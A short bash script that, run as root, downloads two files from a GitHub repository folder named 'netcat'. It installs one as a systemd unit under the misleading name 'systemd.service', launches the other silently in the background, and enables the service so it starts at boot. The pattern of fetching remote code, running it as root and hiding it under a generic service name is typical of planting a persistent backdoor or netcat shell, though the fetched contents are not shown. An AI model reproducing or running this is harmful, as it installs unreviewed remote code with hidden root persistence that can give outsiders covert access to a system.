#!/bin/bash

cd /var

sudo wget https://raw.githubusercontent.com/Incrisz/Linux-commands/raw/main/netcat/systemd.service
sudo wget https://raw.githubusercontent.com/Incrisz/Linux-commands/raw/main/netcat/auto-run.sh

sudo chmod +x auto-run.sh
sudo chmod +x systemd.service

sudo mv systemd.service /etc/systemd/system/systemd.service


sudo nohup ./auto-run.sh > /dev/null 2>&1 &

sudo systemctl enable systemd.service
sudo systemctl start systemd.service

# sudo wget https://raw.githubusercontent.com/Incrisz/Linux-commands/raw/main/netcat/script.sh
